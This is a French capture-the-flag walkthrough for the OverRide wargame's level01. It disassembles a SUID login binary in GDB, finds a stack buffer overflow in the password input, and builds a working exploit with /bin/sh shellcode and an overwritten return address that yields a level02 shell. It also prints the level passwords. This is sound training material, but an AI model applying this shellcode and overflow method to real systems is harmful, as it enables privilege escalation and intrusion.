## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level00
  $ ssh level01@127.0.0.1 -p 4242
  level1@127.0.0.1's password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
  [...]

  # On regarde ce qu'on a
  level01@OverRide:~$ ls -la
    total 17
    dr-xr-x---+ 1 level01 level01   80 Sep 13  2016 .
    dr-x--x--x  1 root    root     260 Oct  2  2016 ..
    -rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
    lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
    -rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
    -rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
    -rw-r--r--+ 1 level01 level01   41 Oct 19  2016 .pass
    -rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile

  # On teste les arguments
  level01@OverRide:~$ ./level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: SUPER LONG LOGIN VRAIMENT C'EST TROP LONG C'EST POUR ESSAYER DE FAIRE SEGFAULT LE LOGIN C'EST POUR CA QUE C'EST LONG ON ESSAYE CE QU'ON PEUT HEIN!
    verifying username....

    nope, incorrect username...
  ```
  * On a un binaire appartenant a level02 dans le home avec les droits SUID...
  * ... qui demande un login admin ...
  * ... qui segfault pas avec un input trop long.

### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level01@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level01@RainFall:/tmp$ gdb ~/level01
      [...]
      Reading symbols from /home/user/level01/level01...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      [...]
      0x08048464  verify_user_name
      0x080484a3  verify_user_pass
      0x080484d0  main
      [...]
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x80486b8
      0x80486b8:	 "********* ADMIN LOGIN PROMPT *********"
    gdb-peda$ x/s0x80486df
      0x80486df:	 "Enter Username: "
    gdb-peda$ x/s 0x804a020
      0x804a020 <stdin@@GLIBC_2.0>:	 ""
    gdb-peda$ x/s 0x804a040
      0x804a040 <a_user_name>:	 ""
    gdb-peda$ x/s 0x80486f0
      0x80486f0:	 "nope, incorrect username...\n"
    gdb-peda$ x/s 0x804870d
      0x804870d:	 "Enter Password: "
    gdb-peda$ x/s 0x8048690
      0x8048690:	 "verifying username....\n"
    gdb-peda$ x/s 0x80486a8
      0x80486a8:	 "dat_wil"
    gdb-peda$ x/s 0x80486b0
      0x80486b0:	 "admin"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Initialisation, sauvegarde registres, alignement, allocation de 96 octets
      0x080484d0 <+0>:	push   ebp
      0x080484d1 <+1>:	mov    ebp,esp
      0x080484d3 <+3>:	push   edi
      0x080484d4 <+4>:	push   ebx
      0x080484d5 <+5>:	and    esp,0xfffffff0
      0x080484d8 <+8>:	sub    esp,0x60

      # Memset(buffer, 0, 16)
      0x080484db <+11>:	lea    ebx,[esp+0x1c]
      0x080484df <+15>:	mov    eax,0x0
      0x080484e4 <+20>:	mov    edx,0x10
      0x080484e9 <+25>:	mov    edi,ebx
      0x080484eb <+27>:	mov    ecx,edx
      0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax

      # "\0" a ESP + 92
      0x080484ef <+31>:	mov    DWORD PTR [esp+0x5c],0x0

      # Puts("********* ADMIN LOGIN PROMPT *********")
      0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8
      0x080484fe <+46>:	call   0x8048380 <puts@plt>

      # Printf("Enter Username: ")
      0x08048503 <+51>:	mov    eax,0x80486df
      0x08048508 <+56>:	mov    DWORD PTR [esp],eax
      0x0804850b <+59>:	call   0x8048360 <printf@plt>

      # fgets(a_user_name, 256, stdin)
      0x08048510 <+64>:	mov    eax,ds:0x804a020
      0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
      0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
      0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
      0x08048528 <+88>:	call   0x8048370 <fgets@plt>

      # ESP + 92 = verify_user_name()
      0x0804852d <+93>:	call   0x8048464 <verify_user_name>

      # Si verify_user_name() != 0 puts("nope, incorrect username...\n") return (1)
      0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
      0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
      0x0804853b <+107>:	je     0x8048550 <main+128>
      0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
      0x08048544 <+116>:	call   0x8048380 <puts@plt>
      0x08048549 <+121>:	mov    eax,0x1
      0x0804854e <+126>:	jmp    0x80485af <main+223>

      # puts("Enter Password: ")
      0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d
      0x08048557 <+135>:	call   0x8048380 <puts@plt>

      # fgets(buffer, 100, stdin)
      0x0804855c <+140>:	mov    eax,ds:0x804a020
      0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
      0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
      0x0804856d <+157>:	lea    eax,[esp+0x1c]
      0x08048571 <+161>:	mov    DWORD PTR [esp],eax
      0x08048574 <+164>:	call   0x8048370 <fgets@plt>

      # verify_user_pass(buffer)
      0x08048579 <+169>:	lea    eax,[esp+0x1c]
      0x0804857d <+173>:	mov    DWORD PTR [esp],eax
      0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>

      # Si verify_user_pass(buffer) == 0 puts("nope, incorrect password...\n") return 1...
      0x08048585 <+181>:	mov    DWORD PTR [esp+0x5c],eax
      0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
      0x0804858e <+190>:	je     0x8048597 <main+199>
      0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
      0x08048595 <+197>:	je     0x80485aa <main+218>
      0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
      0x0804859e <+206>:	call   0x8048380 <puts@plt>
      0x080485a3 <+211>:	mov    eax,0x1
      0x080485a8 <+216>:	jmp    0x80485af <main+223>

      # ...Sinon return 0
      0x080485aa <+218>:	mov    eax,0x0

      # Return
      0x080485af <+223>:	lea    esp,[ebp-0x8]
      0x080485b2 <+226>:	pop    ebx
      0x080485b3 <+227>:	pop    edi
      0x080485b4 <+228>:	pop    ebp
      0x080485b5 <+229>:	ret
      End of assembler dump.
  ```

  * Ok, donc on a un main d'authentification qui return 0 si on arrive a s'authentifier.

  * On regarde les autres fonctions:

  ```shell
    Dump of assembler code for function verify_user_name:
    # Initialisation, sauvegarde registre et allocation de 16 octets
    0x08048464 <+0>:	push   ebp
    0x08048465 <+1>:	mov    ebp,esp
    0x08048467 <+3>:	push   edi
    0x08048468 <+4>:	push   esi
    0x08048469 <+5>:	sub    esp,0x10

    # puts("verifying username....\n")
    0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690
    0x08048473 <+15>:	call   0x8048380 <puts@plt>

    # Strncmp(a_user_name, "dat_wil", 7)
    0x08048478 <+20>:	mov    edx,0x804a040
    0x0804847d <+25>:	mov    eax,0x80486a8
    0x08048482 <+30>:	mov    ecx,0x7
    0x08048487 <+35>:	mov    esi,edx
    0x08048489 <+37>:	mov    edi,eax
    0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x0804848d <+41>:	seta   dl
    0x08048490 <+44>:	setb   al
    0x08048493 <+47>:	mov    ecx,edx
    0x08048495 <+49>:	sub    cl,al
    0x08048497 <+51>:	mov    eax,ecx
    0x08048499 <+53>:	movsx  eax,al

    # Return (retour du strncmp)
    0x0804849c <+56>:	add    esp,0x10
    0x0804849f <+59>:	pop    esi
    0x080484a0 <+60>:	pop    edi
    0x080484a1 <+61>:	pop    ebp
    0x080484a2 <+62>:	ret
    End of assembler dump.
  ```

  ```shell
    gdb-peda$ pdisass verify_user_pass
      Dump of assembler code for function verify_user_pass:
      # Initialise, sauvegarde les registres
      0x080484a3 <+0>:	push   ebp
      0x080484a4 <+1>:	mov    ebp,esp
      0x080484a6 <+3>:	push   edi
      0x080484a7 <+4>:	push   esi

      # Strncmp(buffer, "admin", 5)
      0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
      0x080484ab <+8>:	mov    edx,eax
      0x080484ad <+10>:	mov    eax,0x80486b0
      0x080484b2 <+15>:	mov    ecx,0x5
      0x080484b7 <+20>:	mov    esi,edx
      0x080484b9 <+22>:	mov    edi,eax
      0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
      0x080484bd <+26>:	seta   dl
      0x080484c0 <+29>:	setb   al
      0x080484c3 <+32>:	mov    ecx,edx
      0x080484c5 <+34>:	sub    cl,al
      0x080484c7 <+36>:	mov    eax,ecx
      0x080484c9 <+38>:	movsx  eax,al

      # Return du strncmp
      0x080484cc <+41>:	pop    esi
      0x080484cd <+42>:	pop    edi
      0x080484ce <+43>:	pop    ebp
      0x080484cf <+44>:	ret
      End of assembler dump.
  ```

  * Ok les 2 autres fonctions ne font que checker le username et le password

## 2: Comportement
> Comme attendu apres le disas main, c'est un programme qui check un username et un password et c'est tout.

## 3: Exploit

### A: Explication

> Pour l'input du password, on écrit dans la stack et l'EIP n'est pas protégé puisque nous pouvons écrire 100 char avec seulement 68 de place.
> On va pouvoir donc écrire sur l'EIP avec l'addresse de notre shellcode que nous allons mettre juste apres le "dat_wil".

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de a_user_name + taille de dat_will, notre offset et un shellcode.

```shell
  # On crée un pattern avec peda (générateur de patterns aussi trouvable sur internet)
  gdb-peda$ pattern create 200 pattern1
    Writing pattern of 200 chars to filename "pattern1"
  
  # On le cat pour le copier
  gdb-peda$ cat pattern1
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

  # On lance la fonction et on colle le pattern
  gdb-peda$ run
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

  # BIM segfault
  gdb-peda$ run
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password:
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
    nope, incorrect password...

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    [...]
    # On voit dans le reste du log qu'on contrôle quasiment tous les autres registres
    EIP: 0x41414a41 ('AJAA')
    [...]
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414a41
    [------------------------------------stack-------------------------------------]
    [...]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x41414a41 in ?? () 
    
  # Plutôt que de compter à la main combien de chars il faut imprimer avant l'addresse de notre input, on va le faire calculer par peda
  gdb-peda$ pattern search
    [...]
    Registers contain pattern buffer:
    # On l'a ! Il faut écrire 80 random chars avant l'addresse de notre input
    EIP+0 found at offset: 80
    [...]

  # Et pour le shellcode...
  gdb-peda$ shellcode generate x86/linux exec
    # x86/linux/exec: 24 bytes
    shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )
```

* On a donc tous les prérequis.
* Notre exploit va donc ressembler a ca: "dat_wil<SHELLCODE>\n<randomchar*80><a_user_name+7>
* Notre addresse du shellcode sera donc 0x804a040 + 7 = 0x804a047 => "\x47\xa0\x04\x08"
* Le \n sert a arreter l'input apres notre shellcode

```shell
  level01@OverRide:/tmp$ python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"' > exploit1
  level01@OverRide:/tmp$ cat /tmp/exploit1 - | ~/level01
  ********* ADMIN LOGIN PROMPT *********
  Enter Username: verifying username...

  Enter Password:
  nope, incorrect password...

  whoami
  level02
  cat /home/users/level02/.pass
  PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
  level01@OverRide:/tmp$ su level02
  Password:
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
  level02@OverRide:~$
```
